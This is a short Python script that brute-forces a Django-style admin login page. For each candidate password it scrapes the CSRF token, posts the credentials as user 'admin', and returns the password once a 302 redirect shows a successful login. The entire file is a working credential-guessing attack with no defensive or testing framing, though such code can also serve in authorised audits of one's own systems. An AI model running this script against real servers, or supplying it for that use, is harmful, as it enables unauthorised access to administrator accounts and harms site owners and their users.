import requests


def test_password(server_url, candidates):
    session = requests.Session()

    login_url = server_url + "/admin/login/"

    for password in candidates:
        response = session.get(login_url)

        # Get the CSRF token from the login page
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrfmiddlewaretoken"})["value"]

        data = {
            "username": "admin",
            "password": password,
            "csrfmiddlewaretoken": csrf_token,
            "next": "/admin/"
        }

        login_response = session.post(
            login_url,
            data=data,
            headers={"Referer": login_url},
            allow_redirects=False
        )

        if login_response.status_code == 302:
            return password

    return None